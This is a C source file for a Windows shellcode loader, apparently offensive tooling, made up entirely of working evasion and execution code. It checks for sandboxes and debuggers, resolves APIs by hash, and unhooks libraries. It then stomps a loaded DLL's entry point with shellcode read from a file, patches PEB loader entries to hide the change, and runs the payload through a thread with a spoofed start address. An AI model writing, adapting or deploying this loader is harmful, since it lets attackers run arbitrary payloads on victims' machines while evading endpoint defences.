#include "Ldr.h"

Win32Api win32Api = { 0 };

#ifdef _DEBUG
int main()
#else
extern __declspec (dllexport) func_use()
#endif
{
	PBYTE pbShellcode		= NULL;
	PBYTE pbStompAddr		= NULL;
	DWORD dwShellcodeSize	= 0;

	if (!AntiSandBox())
		goto _CleanUp;
	
	if (!AntiDebugger())
		goto _CleanUp;

	if (!InitApi())
		goto _CleanUp;

	if (!ReadPayLoad(&pbShellcode,&dwShellcodeSize) || !pbShellcode || !dwShellcodeSize)
		goto _CleanUp;

	if (!UnHook(&win32Api))
		goto _CleanUp;

	if (!ModuleStomping(&pbStompAddr) || !pbStompAddr)
		goto _CleanUp;

	RunPayload(pbStompAddr, pbShellcode, dwShellcodeSize);


_CleanUp:
	printf("END : \\O/ \n");
	if (pbShellcode)free(pbShellcode);
	return 0;
}

void RunPayload(PBYTE pbStompAddr, PBYTE pbShellcode, DWORD dwShellcodeSize)
{
	PVOID		pvStompAddr		= pbStompAddr;
	SIZE_T		stShellCodeSize		= dwShellcodeSize;
	ULONG		ulNewProtection 	= PAGE_READWRITE;
	ULONG		ulOldProtection 	= 0;
	NTSTATUS	ntStatus		= 0;
	HANDLE		hThread			= NULL;
	CONTEXT     ctx				= { 0 };

	ntStatus = win32Api.pfnNtProtectVirtualMemory((HANDLE)-1, &pbStompAddr, &stShellCodeSize, ulNewProtection,&ulOldProtection);
	if(ntStatus) __fastfail(0xc00000022);

	_memcpy(pbStompAddr, pbShellcode, dwShellcodeSize);

	ntStatus = win32Api.pfnNtProtectVirtualMemory((HANDLE)-1, &pbStompAddr, &stShellCodeSize, ulOldProtection, &ulOldProtection);
	if (ntStatus) __fastfail(0xc00000022);

	// finish stomp ------- 

	if (!win32Api.pfnNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, win32Api.ulTpReleaseCleanupGroupMembers + 0x450, NULL, TRUE, 0, 0, 0, NULL))
	{
		printf("[+] Spoof Thread Created, Addr 0x%llx :)\n", win32Api.ulTpReleaseCleanupGroupMembers + 0x450);
		ctx.ContextFlags = CONTEXT_FULL;

		if(win32Api.pfnNtGetContextThread(hThread, &ctx))	__fastfail(0xc00000022);
		
		ctx.Rip = (ULONG_PTR)pbStompAddr;
	
		ctx.ContextFlags = CONTEXT_FULL;

		if (win32Api.pfnNtSetContextThread(hThread, &ctx))	__fastfail(0xc00000022);
		if (win32Api.pfnNtResumeThread(hThread, 0))		__fastfail(0xc00000022);
	}
	
	win32Api.pfnNtWaitForSingleObject(hThread, FALSE , NULL);
}

BOOL ModuleStomping(PBYTE* pbStompAddr)
{
	UNICODE_STRING		usDllPath		= {0};
	NTSTATUS		ntStatus		= 0;
	HANDLE			hStomp			= NULL;
	ULONG			ulFlags			= 0x2;// Dont Resolve DllMain && Dont Resolve Reference
	BOOL			bRet			= FALSE;
	PPEB			pBeb			= (PPEB)__readgsqword(0x60);
	PPEB_LDR_DATA	        pPebLdrData		= pBeb->Ldr;
	PLIST_ENTRY		pListHeadNode		= &pPebLdrData->InMemoryOrderModuleList;
	PLIST_ENTRY		pCurrentNode		= pListHeadNode->Flink;

	_RtlInitUnicodeString(&usDllPath, TARGETDLL);

	// spoof call ?? chill bro :)
	ntStatus = win32Api.pfnLdrLoadDll(NULL, &ulFlags, &usDllPath, &hStomp);

	if (ntStatus || hStomp == INVALID_HANDLE_VALUE || !hStomp)
		goto _CleanUp;

	*pbStompAddr = (ULONG_PTR)hStomp + ((PIMAGE_NT_HEADERS)((ULONG_PTR)hStomp + ((PIMAGE_DOS_HEADER)(hStomp))->e_lfanew))->OptionalHeader.AddressOfEntryPoint;
	printf("[+] Stomp Module: %ws, Addr 0x%llx \n", TARGETDLL, *pbStompAddr);

	//PatchPEB 
	while (pCurrentNode != pListHeadNode)
	{
		PLDR_DATA_TABLE_ENTRY2	pLdrDataTableEntry	= CONTAINING_RECORD(pCurrentNode, LDR_DATA_TABLE_ENTRY2, InMemoryOrderLinks);
		wchar_t*				pwszDllName			= NULL;
		WCHAR					wszDllName[20]		= {0};

		pwszDllName = GetDllName(pLdrDataTableEntry->FullDllName.Buffer);

		DWORD dwModuleHash = HASHw(pwszDllName);
 
		// https://bruteratel.com/release/2023/03/19/Release-Nightmare/
		if (dwModuleHash == CHARKRAHASH)
		{
			pLdrDataTableEntry->EntryPoint = (PVOID)*pbStompAddr;
			pLdrDataTableEntry->ImageDll = 0x1;
			pLdrDataTableEntry->LoadNotificationsSent = 0x1;
			pLdrDataTableEntry->ProcessStaticImport = 0x1;
			printf("[+] PEB Struct Patch Successfully \n");
			break;
		}

		pCurrentNode = pCurrentNode->Flink;
	}

	
	bRet = TRUE;

_CleanUp:
	return bRet;
}

BOOL InitApi()
{
	ULONG_PTR	ulKernel32	= 0;
	ULONG_PTR	ulNtdll		= 0;
	BOOL		bRet		= FALSE;
	
	if (!GetImageBaseByStack(&ulKernel32, &ulNtdll))
		goto _CleanUp;

	win32Api.pfnSleep					= (evaSleep)GetProcAddressByHash(ulKernel32, SLEEPHASH);
	win32Api.pfnLdrLoadDll					= (evaLdrLoadDll)GetProcAddressByHash(ulNtdll, LDRLOADDLLHASH);
	win32Api.pfnNtProtectVirtualMemory			= (evaNtProtectVirtualMemory)GetProcAddressByHash(ulNtdll, NTPROTECTVIRTUALMEMORYHASH);
	win32Api.pfnNtCreateThreadEx				= (evaNtCreateThreadEx)GetProcAddressByHash(ulNtdll, NTCREATETHREADEXHASH);
	win32Api.pfnNtResumeThread				= (evaNtResumeThread)GetProcAddressByHash(ulNtdll, NTRESUMETHREADHASH);
	win32Api.pfnNtGetContextThread				= (evaNtGetContextThread)GetProcAddressByHash(ulNtdll, NTGETCONTEXTTHREADHASH);
	win32Api.pfnNtSetContextThread				= (evaNtSetContextThread)GetProcAddressByHash(ulNtdll, NTSETCONTEXTTHREADHASH);
	win32Api.pfnGetModuleHandleW				= (evaGetModuleHandleW)GetProcAddressByHash(ulKernel32, GETMODULEHANDLEWHASH);
	win32Api.pfnCreateFileMappingW				= (evaCreateFileMappingW)GetProcAddressByHash(ulKernel32, CREATEFILEMAPPINGWHASH);
	win32Api.pfnMapViewOfFile				= (evaMapViewOfFile)GetProcAddressByHash(ulKernel32, MAPVIEWOFFILEWHASH);
	win32Api.pfnUnmapViewOfFile				= (evaUnmapViewOfFile)GetProcAddressByHash(ulKernel32, UNMAPVIEWOFFILEWHASH);
	win32Api.pfnCloseHandle					= (evaCloseHandle)GetProcAddressByHash(ulKernel32,CLOSEHANDLEHASH);
	win32Api.pfnReadFile					= (evaReadFile)GetProcAddressByHash(ulKernel32,READFILEHASH);
	win32Api.pfnCreateFileW					= (evaCreateFileW)GetProcAddressByHash(ulKernel32,CREATEFILEWHASH);
	win32Api.pfnGetFileSize					= (evaGetFileSize)GetProcAddressByHash(ulKernel32,GETFILESIZEHASH);
	win32Api.pfnNtWaitForSingleObject			= (evaNtWaitForSingleObject)GetProcAddressByHash(ulNtdll, NTWAITFORSINGLEOBJECTHASH);
	win32Api.ulTpReleaseCleanupGroupMembers = (ULONG_PTR)GetProcAddressByHash(ulNtdll, TPRELEASECLEANUPGROUPMEMBERSHASH);

	if (win32Api.pfnCloseHandle && win32Api.pfnReadFile && win32Api.pfnCreateFileW && win32Api.pfnGetFileSize &&
		win32Api.pfnLdrLoadDll && win32Api.pfnNtProtectVirtualMemory && win32Api.pfnNtCreateThreadEx &&
		win32Api.pfnNtResumeThread && win32Api.pfnNtGetContextThread && win32Api.pfnNtSetContextThread && win32Api.ulTpReleaseCleanupGroupMembers &&
		win32Api.pfnGetModuleHandleW && win32Api.pfnCreateFileMappingW && win32Api.pfnMapViewOfFile && win32Api.pfnUnmapViewOfFile &&
		win32Api.pfnSleep && win32Api.pfnNtWaitForSingleObject)
		bRet = TRUE;

_CleanUp:
	return bRet;
}

BOOL ReadPayLoad(PBYTE* pbShellcode, PDWORD pdwShellcodeSize)
{
	BOOL        bRet					= FALSE;
	HANDLE		hFile					= INVALID_HANDLE_VALUE;
	DWORD		dwFileSize				= 0;
	PVOID		pvShellcodeBuffer			= NULL;
	DWORD		dwNumberOfBytesRead			= 0;
	wchar_t*	pszCurrentLastBackSlashPath		= NULL;
	wchar_t		szShellCodeName[20]			= L"xxb.bin"; // Replace Me :)
	wchar_t		szShellCodePath[MAX_PATH]		= { 0 };
	wchar_t		szCurrentDirectory[MAX_PATH]		= { 0 };
	
	GetModuleFileNameW(NULL, szCurrentDirectory, MAX_PATH);

	pszCurrentLastBackSlashPath = wcsrchr(szCurrentDirectory, L'\\');

	if (pszCurrentLastBackSlashPath != NULL)
	{
		size_t pathLength = pszCurrentLastBackSlashPath - szCurrentDirectory + 1;
		wcsncpy(szShellCodePath, szCurrentDirectory, pathLength);
		szShellCodePath[pathLength] = L'\0';
		wcscat(szShellCodePath, szShellCodeName);
	}

#ifdef _DEBUG
	hFile = win32Api.pfnCreateFileW(L"C:\\Users\\test\\Desktop\\xxb.bin", GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
#else
	hFile = win32Api.pfnCreateFileW(szShellCodeName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
#endif 

	if (hFile == INVALID_HANDLE_VALUE || !hFile)
		goto _FUNC_CLEANUP;

	if ((dwFileSize = win32Api.pfnGetFileSize(hFile, NULL)) == INVALID_FILE_SIZE)
		goto _FUNC_CLEANUP;

	pvShellcodeBuffer = calloc(dwFileSize, sizeof(BYTE));

	if (!pvShellcodeBuffer)
		goto _FUNC_CLEANUP;

	if (!win32Api.pfnReadFile(hFile, pvShellcodeBuffer, dwFileSize, &dwNumberOfBytesRead, NULL) || dwFileSize != dwNumberOfBytesRead)
		goto _FUNC_CLEANUP;

	// Decrypt? ReplaceMe :)
	//unsigned char	s[256] = { 0x29 ,0x23 ,0xBE ,0x84 ,0xE1 ,0x6C ,0xD6 ,0xAE ,0x00 };
	//char	key[256] = { 0x79 ,0x63 ,0x62 ,0x74 ,0x64 ,0x76 ,0x61 ,0x64 ,0x61 ,0x65 ,0x00 };
	//
	//RC4Init(s, key, (unsigned long)strlen(key));
	//RC4Crypt(s, pvShellcodeBuffer, dwFileSize);
	
	printf("[+] Read Payload Successfully, len %d \n", dwFileSize);

	*pbShellcode		= (PBYTE)pvShellcodeBuffer;
	*pdwShellcodeSize	= dwFileSize;
	bRet = TRUE;

_FUNC_CLEANUP:

	if (hFile)
		win32Api.pfnCloseHandle(hFile);

	return bRet;
}
